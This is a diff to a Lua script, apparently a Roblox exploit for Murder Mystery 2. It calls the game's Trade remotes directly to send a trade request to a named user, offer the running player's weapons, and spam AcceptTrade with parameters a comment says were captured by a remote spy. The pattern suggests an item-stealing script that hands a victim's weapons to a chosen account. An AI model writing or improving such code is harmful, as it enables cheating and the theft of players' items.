@@ -249,19 +249,7 @@ local function MM2()
                 return false
             end
             
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-            if not remote then
-                print("Remote Trade non trouvé")
-                return false
-            end
-            
-            local sendRemote = remote:FindFirstChild("SendRequest")
-            if not sendRemote then
-                print("Remote SendRequest non trouvé")
-                return false
-            end
-            
-            sendRemote:InvokeServer(targetPlayer)
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(targetPlayer)
             print("Demande de trade envoyée à " .. user)
             return true
         end)
@@ -275,15 +263,7 @@ local function MM2()
 
     local function getTradeStatus()
         local success, status = pcall(function()
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-            if not remote then
-                return "None"
-            end
-            local statusRemote = remote:FindFirstChild("GetTradeStatus")
-            if not statusRemote then
-                return "None"
-            end
-            return statusRemote:InvokeServer()
+            return game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
         end)
         if success then
             return status or "None"
@@ -306,7 +286,7 @@ local function MM2()
         end
     end
 
-    -- FONCTION ACCEPT TRACE CORRIGÉE AVEC LES BONS PARAMÈTRES
+    -- FONCTION ACCEPT TRADE AVEC LA BONNE SYNTAXE
     local function acceptTradeWithSpam()
         print("Début du spam d'acceptation du trade...")
         
@@ -340,51 +320,29 @@ local function MM2()
         
         print("Trade en StartTrade, spam d'acceptation...")
         
-        -- Spam l'acceptation avec les BONS paramètres
+        -- Spam l'acceptation avec la bonne syntaxe
         while acceptAttempts < maxAttempts do
             pcall(function()
-                local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-                if remote then
-                    local acceptRemote = remote:FindFirstChild("AcceptTrade")
-                    if acceptRemote then
-                        -- LES BONS PARAMÈTRES : [ID, TIMESTAMP]
-                        local args = {
-                            [1] = 428469873,  -- ID fixe comme dans ton spy
-                            [2] = tick() * 1000  -- Timestamp en millisecondes
-                        }
-                        acceptRemote:FireServer(unpack(args))
-                    end
-                end
+                -- Méthode avec les bons paramètres comme dans ton spy
+                local args = {
+                    [1] = 428469873,
+                    [2] = tick() * 1000
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
             end)
             
             -- Deuxième méthode avec timestamp différent
             pcall(function()
-                local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-                if remote then
-                    local acceptRemote = remote:FindFirstChild("AcceptTrade")
-                    if acceptRemote then
-                        local args = {
-                            [1] = 428469873,
-                            [2] = os.time() * 1000
-                        }
-                        acceptRemote:FireServer(unpack(args))
-                    end
-                end
+                local args = {
+                    [1] = 428469873,
+                    [2] = os.time() * 1000
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
             end)
             
-            -- Troisième méthode avec timestamp aléatoire
+            -- Troisième méthode sans paramètres (au cas où)
             pcall(function()
-                local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-                if remote then
-                    local acceptRemote = remote:FindFirstChild("AcceptTrade")
-                    if acceptRemote then
-                        local args = {
-                            [1] = 428469873,
-                            [2] = math.random(10000, 99999999)
-                        }
-                        acceptRemote:FireServer(unpack(args))
-                    end
-                end
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
             end)
             
             acceptAttempts = acceptAttempts + 1
@@ -408,17 +366,11 @@ local function MM2()
 
     local function addWeaponToTrade(id)
         pcall(function()
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
-            if remote then
-                local offerRemote = remote:FindFirstChild("OfferItem")
-                if offerRemote then
-                    local args = {
-                        [1] = id,
-                        [2] = "Weapons"
-                    }
-                    offerRemote:FireServer(unpack(args))
-                end
-            end
+            local args = {
+                [1] = id,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
         end)
     end
 
